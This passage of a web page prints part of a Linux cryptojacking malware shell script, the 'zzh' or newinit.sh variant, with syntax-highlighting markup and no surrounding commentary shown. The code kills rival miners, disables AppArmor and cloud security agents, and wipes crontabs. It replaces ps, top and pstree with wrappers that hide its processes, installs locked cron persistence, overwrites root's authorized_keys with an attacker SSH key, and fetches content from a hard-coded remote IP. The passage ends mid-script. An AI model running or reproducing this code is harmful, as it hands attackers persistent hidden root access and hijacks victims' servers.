-f irqbalanc1</span><br><span class="line">pkill -f minerd</span><br><span class="line">pkill -f i586</span><br><span class="line">pkill -f gddr</span><br><span class="line">pkill -f mstxmr</span><br><span class="line">pkill -f ddg.2011</span><br><span class="line">pkill -f wnTKYg</span><br><span class="line">pkill -f deamon</span><br><span class="line">pkill -f disk_genius</span><br><span class="line">pkill -f sourplum</span><br><span class="line">pkill -f polkitd</span><br><span class="line">pkill -f nanoWatch</span><br><span class="line">pkill -f zigw</span><br><span class="line">pkill -f devtool</span><br><span class="line">pkill -f devtools</span><br><span class="line">pkill -f systemctI</span><br><span class="line">pkill -f watchbog</span><br><span class="line">pkill -f cryptonight</span><br><span class="line">pkill -f sustes</span><br><span class="line">pkill -f xmrig</span><br><span class="line">pkill -f xmrig-cpu</span><br><span class="line">pkill -f 121.42.151.137</span><br><span class="line">pkill -f init12.cfg</span><br><span class="line">pkill -f nginxk</span><br><span class="line">pkill -f tmp/wc.conf</span><br><span class="line">pkill -f xmrig-notls</span><br><span class="line">pkill -f xmr-stak</span><br><span class="line">pkill -f suppoie</span><br><span class="line">pkill -f zer0day.ru</span><br><span class="line">pkill -f dbus-daemon--system</span><br><span class="line">pkill -f nullcrew</span><br><span class="line">pkill -f systemctI</span><br><span class="line">pkill -f kworkerds</span><br><span class="line">pkill -f init10.cfg</span><br><span class="line">pkill -f /wl.conf</span><br><span class="line">pkill -f crond64</span><br><span class="line">pkill -f sustse</span><br><span class="line">pkill -f vmlinuz</span><br><span class="line">pkill -f exin</span><br><span class="line">pkill -f apachiii</span><br><span class="line">pkill -f svcworkmanager</span><br><span class="line">pkill -f xr</span><br><span class="line">pkill -f trace</span><br><span class="line">pkill -f svcupdate</span><br><span class="line">pkill -f networkmanager</span><br><span class="line">pkill -f phpupdate</span><br><span class="line">rm -rf /usr/bin/config.json</span><br><span class="line">rm -rf /usr/bin/exin</span><br><span class="line">rm -rf /tmp/wc.conf</span><br><span class="line">rm -rf /tmp/log_rot</span><br><span class="line">rm -rf /tmp/apachiii</span><br><span class="line">rm -rf /tmp/sustse</span><br><span class="line">rm -rf /tmp/php</span><br><span class="line">rm -rf /tmp/p2.conf</span><br><span class="line">rm -rf /tmp/pprt</span><br><span class="line">rm -rf /tmp/ppol</span><br><span class="line">rm -rf /tmp/javax/config.sh</span><br><span class="line">rm -rf /tmp/javax/sshd2</span><br><span class="line">rm -rf /tmp/.profile</span><br><span class="line">rm -rf /tmp/1.so</span><br><span class="line">rm -rf /tmp/kworkerds</span><br><span class="line">rm -rf /tmp/kworkerds3</span><br><span class="line">rm -rf /tmp/kworkerdssx</span><br><span class="line">rm -rf /tmp/xd.json</span><br><span class="line">rm -rf /tmp/syslogd</span><br><span class="line">rm -rf /tmp/syslogdb</span><br><span class="line">rm -rf /tmp/65ccEJ7</span><br><span class="line">rm -rf /tmp/jmxx</span><br><span class="line">rm -rf /tmp/2Ne80nA</span><br><span class="line">rm -rf /tmp/dl</span><br><span class="line">rm -rf /tmp/ddg</span><br><span class="line">rm -rf /tmp/systemxlv</span><br><span class="line">rm -rf /tmp/systemctI</span><br><span class="line">rm -rf /tmp/.abc</span><br><span class="line">rm -rf /tmp/osw.hb</span><br><span class="line">rm -rf /tmp/.tmpleve</span><br><span class="line">rm -rf /tmp/.tmpnewzz</span><br><span class="line">rm -rf /tmp/.java</span><br><span class="line">rm -rf /tmp/.omed</span><br><span class="line">rm -rf /tmp/.tmpc</span><br><span class="line">rm -rf /tmp/.tmpleve</span><br><span class="line">rm -rf /tmp/.tmpnewzz</span><br><span class="line">rm -rf /tmp/gates.lod</span><br><span class="line">rm -rf /tmp/conf.n</span><br><span class="line">rm -rf /tmp/devtool</span><br><span class="line">rm -rf /tmp/devtools</span><br><span class="line">rm -rf /tmp/fs</span><br><span class="line">rm -rf /tmp/.rod</span><br><span class="line">rm -rf /tmp/.rod.tgz</span><br><span class="line">rm -rf /tmp/.rod.tgz.1</span><br><span class="line">rm -rf /tmp/.rod.tgz.2</span><br><span class="line">rm -rf /tmp/.mer</span><br><span class="line">rm -rf /tmp/.mer.tgz</span><br><span class="line">rm -rf /tmp/.mer.tgz.1</span><br><span class="line">rm -rf /tmp/.hod</span><br><span class="line">rm -rf /tmp/.hod.tgz</span><br><span class="line">rm -rf /tmp/.hod.tgz.1</span><br><span class="line">rm -rf /tmp/84Onmce</span><br><span class="line">rm -rf /tmp/C4iLM4L</span><br><span class="line">rm -rf /tmp/lilpip</span><br><span class="line">rm -rf /tmp/3lmigMo</span><br><span class="line">rm -rf /tmp/am8jmBP</span><br><span class="line">rm -rf /tmp/tmp.txt</span><br><span class="line">rm -rf /tmp/baby</span><br><span class="line">rm -rf /tmp/.lib</span><br><span class="line">rm -rf /tmp/systemd</span><br><span class="line">rm -rf /tmp/lib.tar.gz</span><br><span class="line">rm -rf /tmp/baby</span><br><span class="line">rm -rf /tmp/java</span><br><span class="line">rm -rf /tmp/j2.conf</span><br><span class="line">rm -rf /tmp/.mynews1234</span><br><span class="line">rm -rf /tmp/a3e12d</span><br><span class="line">rm -rf /tmp/.pt</span><br><span class="line">rm -rf /tmp/.pt.tgz</span><br><span class="line">rm -rf /tmp/.pt.tgz.1</span><br><span class="line">rm -rf /tmp/go</span><br><span class="line">rm -rf /tmp/java</span><br><span class="line">rm -rf /tmp/j2.conf</span><br><span class="line">rm -rf /tmp/.tmpnewasss</span><br><span class="line">rm -rf /tmp/java</span><br><span class="line">rm -rf /tmp/go.sh</span><br><span class="line">rm -rf /tmp/go2.sh</span><br><span class="line">rm -rf /tmp/khugepageds</span><br><span class="line">rm -rf /tmp/.censusqqqqqqqqq</span><br><span class="line">rm -rf /tmp/.kerberods</span><br><span class="line">rm -rf /tmp/kerberods</span><br><span class="line">rm -rf /tmp/seasame</span><br><span class="line">rm -rf /tmp/touch</span><br><span class="line">rm -rf /tmp/.p</span><br><span class="line">rm -rf /tmp/runtime2.sh</span><br><span class="line">rm -rf /tmp/runtime.sh</span><br><span class="line">rm -rf /dev/shm/z3.sh</span><br><span class="line">rm -rf /dev/shm/z2.sh</span><br><span class="line">rm -rf /dev/shm/.scr</span><br><span class="line">rm -rf /dev/shm/.kerberods</span><br><span class="line">rm -f /etc/ld.so.preload</span><br><span class="line">rm -f /usr/<span class="built_in">local</span>/lib/libioset.so</span><br><span class="line">chattr -i /etc/ld.so.preload</span><br><span class="line">rm -f /etc/ld.so.preload</span><br><span class="line">rm -f /usr/<span class="built_in">local</span>/lib/libioset.so</span><br><span class="line">rm -rf /tmp/watchdogs</span><br><span class="line">rm -rf /etc/cron.d/tomcat</span><br><span class="line">rm -rf /etc/rc.d/init.d/watchdogs</span><br><span class="line">rm -rf /usr/sbin/watchdogs</span><br><span class="line">rm -f /tmp/kthrotlds</span><br><span class="line">rm -f /etc/rc.d/init.d/kthrotlds</span><br><span class="line">rm -rf /tmp/.sysbabyuuuuu12</span><br><span class="line">rm -rf /tmp/logo9.jpg</span><br><span class="line">rm -rf /tmp/miner.sh</span><br><span class="line">rm -rf /tmp/nullcrew</span><br><span class="line">rm -rf /tmp/proc</span><br><span class="line">rm -rf /tmp/2.sh</span><br><span class="line">rm /opt/atlassian/confluence/bin/1.sh</span><br><span class="line">rm /opt/atlassian/confluence/bin/1.sh.1</span><br><span class="line">rm /opt/atlassian/confluence/bin/1.sh.2</span><br><span class="line">rm /opt/atlassian/confluence/bin/1.sh.3</span><br><span class="line">rm /opt/atlassian/confluence/bin/3.sh</span><br><span class="line">rm /opt/atlassian/confluence/bin/3.sh.1</span><br><span class="line">rm /opt/atlassian/confluence/bin/3.sh.2</span><br><span class="line">rm /opt/atlassian/confluence/bin/3.sh.3</span><br><span class="line">rm -rf /var/tmp/f41</span><br><span class="line">rm -rf /var/tmp/2.sh</span><br><span class="line">rm -rf /var/tmp/config.json</span><br><span class="line">rm -rf /var/tmp/xmrig</span><br><span class="line">rm -rf /var/tmp/1.so</span><br><span class="line">rm -rf /var/tmp/kworkerds3</span><br><span class="line">rm -rf /var/tmp/kworkerdssx</span><br><span class="line">rm -rf /var/tmp/kworkerds</span><br><span class="line">rm -rf /var/tmp/wc.conf</span><br><span class="line">rm -rf /var/tmp/nadezhda.</span><br><span class="line">rm -rf /var/tmp/nadezhda.arm</span><br><span class="line">rm -rf /var/tmp/nadezhda.arm.1</span><br><span class="line">rm -rf /var/tmp/nadezhda.arm.2</span><br><span class="line">rm -rf /var/tmp/nadezhda.x86_64</span><br><span class="line">rm -rf /var/tmp/nadezhda.x86_64.1</span><br><span class="line">rm -rf /var/tmp/nadezhda.x86_64.2</span><br><span class="line">rm -rf /var/tmp/sustse3</span><br><span class="line">rm -rf /var/tmp/sustse</span><br><span class="line">rm -rf /var/tmp/moneroocean/</span><br><span class="line">rm -rf /var/tmp/devtool</span><br><span class="line">rm -rf /var/tmp/devtools</span><br><span class="line">rm -rf /var/tmp/play.sh</span><br><span class="line">rm -rf /var/tmp/systemctI</span><br><span class="line">rm -rf /var/tmp/.java</span><br><span class="line">rm -rf /var/tmp/1.sh</span><br><span class="line">rm -rf /var/tmp/conf.n</span><br><span class="line">rm -r /var/tmp/lib</span><br><span class="line">rm -r /var/tmp/.lib</span><br><span class="line">chattr -iau /tmp/lok</span><br><span class="line">chmod +700 /tmp/lok</span><br><span class="line">rm -rf /tmp/lok</span><br><span class="line">sleep 1</span><br><span class="line">chattr -i /tmp/kdevtmpfsi</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/kdevtmpfsi</span><br><span class="line">chattr +i /tmp/kdevtmpfsi</span><br><span class="line">sleep 1</span><br><span class="line">chattr -i /tmp/redis2</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/redis2</span><br><span class="line">chattr +i /tmp/redis2</span><br><span class="line">chattr -ia /.Xll/xr</span><br><span class="line">&gt;/.Xll/xr</span><br><span class="line">chattr +ia /.Xll/xr</span><br><span class="line">chattr -ia /etc/trace</span><br><span class="line">&gt;/etc/trace</span><br><span class="line">chattr +ia /etc/trace</span><br><span class="line">chattr -ia /etc/newsvc.sh</span><br><span class="line">chattr -ia /etc/svc*</span><br><span class="line">chattr -ia /tmp/newsvc.sh</span><br><span class="line">chattr -ia /tmp/svc*</span><br><span class="line">&gt;/etc/newsvc.sh</span><br><span class="line">&gt;/etc/svcupdate</span><br><span class="line">&gt;/etc/svcguard</span><br><span class="line">&gt;/etc/svcworkmanager</span><br><span class="line">&gt;/etc/svcupdates</span><br><span class="line">&gt;/tmp/newsvc.sh</span><br><span class="line">&gt;/tmp/svcupdate</span><br><span class="line">&gt;/tmp/svcguard</span><br><span class="line">&gt;/tmp/svcworkmanager</span><br><span class="line">&gt;/tmp/svcupdates</span><br><span class="line">chattr +ia /etc/newsvc.sh</span><br><span class="line">chattr +ia /etc/svc*</span><br><span class="line">chattr +ia /tmp/newsvc.sh</span><br><span class="line">chattr +ia /tmp/svc*</span><br><span class="line">sleep 1</span><br><span class="line">chattr -ia /etc/phpupdate</span><br><span class="line">chattr -ia /etc/phpguard</span><br><span class="line">chattr -ia /etc/networkmanager</span><br><span class="line">chattr -ia /etc/newdat.sh</span><br><span class="line">&gt;/etc/phpupdate</span><br><span class="line">&gt;/etc/phpguard</span><br><span class="line">&gt;/etc/networkmanager</span><br><span class="line">&gt;/etc/newdat.sh</span><br><span class="line">chattr +ia /etc/phpupdate</span><br><span class="line">chattr +ia /etc/phpguard</span><br><span class="line">chattr +ia /etc/networkmanager</span><br><span class="line">chattr +ia /etc/newdat.sh</span><br><span class="line">sleep 1</span><br><span class="line">chattr -i /usr/lib/systemd/systemd-update-daily</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /usr/lib/systemd/systemd-update-daily</span><br><span class="line">chattr +i /usr/lib/systemd/systemd-update-daily</span><br><span class="line"><span class="comment">#yum install -y docker.io || apt-get install docker.io;</span></span><br><span class="line">docker ps | grep <span class="string">&quot;pocosow&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;gakeaws&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;azulu&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;auto&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;xmr&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;mine&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;slowhttp&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;bash.shell&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;entrypoint.sh&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker ps | grep <span class="string">&quot;/var/sbin/bash&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % docker <span class="built_in">kill</span> %</span><br><span class="line">docker images -a | grep <span class="string">&quot;pocosow&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;gakeaws&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;buster-slim&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;hello-&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;azulu&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;registry&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;xmr&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;auto&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;mine&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;monero&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line">docker images -a | grep <span class="string">&quot;slowhttp&quot;</span> | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | xargs -I % docker rmi -f %</span><br><span class="line"><span class="comment">#echo SELINUX=disabled &gt;/etc/selinux/config</span></span><br><span class="line">service apparmor stop</span><br><span class="line">systemctl <span class="built_in">disable</span> apparmor</span><br><span class="line">service aliyun.service stop</span><br><span class="line">systemctl <span class="built_in">disable</span> aliyun.service</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aegis&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;Yun&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">rm -rf /usr/<span class="built_in">local</span>/aegis</span><br><span class="line">chattr -R -ia /var/spool/cron</span><br><span class="line">chattr -ia /etc/crontab</span><br><span class="line">chattr -R -ia /etc/cron.d</span><br><span class="line">chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">crontab -r</span><br><span class="line">rm -rf /var/spool/cron/*</span><br><span class="line">rm -rf /etc/cron.d/*</span><br><span class="line">rm -rf /var/spool/cron/crontabs</span><br><span class="line">rm -rf /etc/crontab</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kill_sus_proc()</span><br><span class="line">&#123;</span><br><span class="line">    ps axf -o <span class="string">&quot;pid&quot;</span>|<span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            ls -l /proc/<span class="variable">$procid</span>/exe | grep /tmp</span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 1 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">                    <span class="keyword">then</span></span><br><span class="line">                            <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">                    <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    ps axf -o <span class="string">&quot;pid %cpu&quot;</span> | awk <span class="string">&#x27;&#123;if($2&gt;=40.0) print $1&#125;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">downloads()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/usr/bin/curl&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span> </span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$1</span>,<span class="variable">$2</span></span><br><span class="line">        http_code=`curl -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/cd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        http_code=`cd1 -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wget&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wget --timeout=50 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                wget --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -eq 0 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kill_miner_proc</span><br><span class="line">kill_sus_proc</span><br><span class="line"></span><br><span class="line">unlock_cron()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R -ia /var/spool/cron</span><br><span class="line">    chattr -ia /etc/crontab</span><br><span class="line">    chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R -ia /etc/cron.d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lock_cron()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R +ia /var/spool/cron</span><br><span class="line">    chattr +ia /etc/crontab</span><br><span class="line">    chattr -R +ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R +ia /etc/cron.d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$rtdir</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;i am root&quot;</span></span><br><span class="line">        mkdir -p /root/.ssh</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;goto 1&quot;</span> &gt;&gt; /etc/zzhs</span><br><span class="line">        chattr -ia /etc/zzh*</span><br><span class="line">        chattr -ia /etc/newinit.sh*</span><br><span class="line">        chattr -ia /root/.ssh/authorized_keys*</span><br><span class="line">        chattr -R -ia /root/.ssh</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/ps changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/ps /bin/ps.original</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;/bin/ps</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;ps.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;/bin/ps</span><br><span class="line">        chmod +x /bin/ps</span><br><span class="line">                touch -d 20160825 /bin/ps</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/ps changing&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/top.original&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/top changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/top /bin/top.original</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;/bin/top</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;top.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;/bin/top</span><br><span class="line">        chmod +x /bin/top</span><br><span class="line">                touch -d 20160825 /bin/top</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/top changing&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/pstree.original&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/pstree changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/pstree /bin/pstree.original</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;/bin/pstree</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;pstree.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;/bin/pstree</span><br><span class="line">        chmod +x /bin/pstree</span><br><span class="line">                touch -d 20160825 /bin/pstree</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;/bin/pstree changing&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/chattr&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                chattrsize=`ls -l /bin/chattr | awk <span class="string">&#x27;&#123; print $5 &#125;&#x27;</span>`</span><br><span class="line">                <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$chattrsize</span>&quot;</span> -lt <span class="string">&quot;<span class="variable">$chattr_size</span>&quot;</span> ]</span><br><span class="line">                <span class="keyword">then</span></span><br><span class="line">            yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;no need install chattr&quot;</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">                        unlock_cron</span><br><span class="line">                        rm -f <span class="variable">$&#123;crondir&#125;</span></span><br><span class="line">                        rm -f /etc/cron.d/zzh</span><br><span class="line">                        rm -f /etc/crontab</span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;*/30 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="variable">$&#123;crondir&#125;</span></span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;*/40 * * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; /etc/cron.d/zzh</span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">&quot;0 1 * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; /etc/crontab</span><br><span class="line">                        <span class="built_in">echo</span> crontab created</span><br><span class="line">                        lock_cron</span><br><span class="line">        chmod 700 /root/.ssh/</span><br><span class="line">        <span class="built_in">echo</span> &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">        chmod 600 /root/.ssh/authorized_keys</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver&quot;</span> &gt; /root/.ssh/authorized_keys</span><br><span class="line">        cd1 http://106.15.74.113/b2f628/call.txt</span><br><span class="line">        wget -q -O- http://106.15.74.113/b2f628/call.txt</span><br><span class="line">        cd1 http://106.15.74.113/b2f628/call.txt</span><br><span class="line">        wget -q -O- http://106.15.74.113/b2f628/call.txt</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        file=<span class="string">&quot;/etc/zzh&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/etc/zzh&quot;</span> ]</span><br><span class="line">    <span 